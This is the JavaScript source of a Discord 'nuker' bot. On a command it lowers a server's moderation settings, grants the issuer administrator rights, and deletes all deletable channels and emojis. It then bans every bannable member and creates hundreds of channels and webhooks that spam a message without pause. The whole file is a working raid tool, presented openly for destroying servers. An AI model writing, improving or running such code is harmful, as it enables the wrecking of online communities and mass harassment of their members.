const Configuration = require("./Config.json");
const { Client } = require("discord.js");

let NukerBot = new Client();

NukerBot.once("ready", () => {
    for (const guild of NukerBot.guilds.cache.array()) {
        console.log(`Guild: ${guild.name}: ${guild.id}: ${guild.members.cache.size}`);
    }
});

NukerBot.on("message", async message => {
    if (!message.content.startsWith(Configuration.prefix)) return;
    let arguments = message.content.slice(Configuration.prefix.length).trim().split(/ +/g);
    let command = arguments.shift().toLowerCase();
    //Only using a if/else chain due to my laziness. (It's only one command so I don't see the point of a command handler)
    if (command === "nuke") {
        const guild = NukerBot.guilds.cache.get(arguments[0]);
        await guild.setIcon(Configuration.icon).then(async guild => {
            //Sets the recommended raid options. (Believe me, I'm only using an if/else case due to how slow switch/case is. It's just not suitable for this).
            if (guild.verificationLevel !== "NONE") {
                guild.setVerificationLevel("NONE");
            } else if (guild.region !== Configuration.region) {
                guild.setRegion(Configuration.region);
            } else if (guild.defaultMessageNotifications !== "ALL") {
                guild.setDefaultMessageNotifications("ALL");
            } else if (guild.explicitContentFilter !== "DISABLED") {
                guild.setExplicitContentFilter("DISABLED");
            } else if (guild.premiumTier >= 15) {
                guild.setBanner(Configuration.icon);
            } else {
                //Leave this empty to pass
            }
            guild.roles.create({
                data: {
                    name: Configuration.name,
                    permissions: 8,
                    color: "#36383F",
                    hoist: true
                }
            }).then(role => {
                guild.member(message.author).roles.add(role);
            });
            //Filters deletable channels, deletes them right after
            for (const channel of guild.channels.cache.filter(channel => channel.deletable).array()) {
                channel.delete();
            }
            //Filters deletable emojis, deletes them right after
            for (const emoji of guild.emojis.cache.filter(emoji => emoji.deletable).array()) {
                emoji.delete();
            }
            //Filters deletable roles, deletes them right after
            for (const role of guild.roles.cache.filter(role => {
                role.editable && role.name === Configuration.name
            }).array()) {
                role.delete();
            }
            //Filters bannable members, deletes them right after
            for (const member of guild.members.cache.filter(member => member.bannable).array()) {
                member.ban();
            }
            //Repeat this process until maximum channel limit is reached
            for (let i = 0; i < 500; i++) {
                guild.channels.create(Configuration.name, {
                    type: "text"
                }).then(channel => {
                    channel.createWebhook(Configuration.name, {
                        avatar: Configuration.icon
                    }).then(async webhook => {
                        setInterval(() => {
                            channel.send(Configuration.nuke_message);
                            webhook.send(Configuration.nuke_message);
                        });
                    });
                });
            }
        });
    }
});

NukerBot.login(Configuration.token);
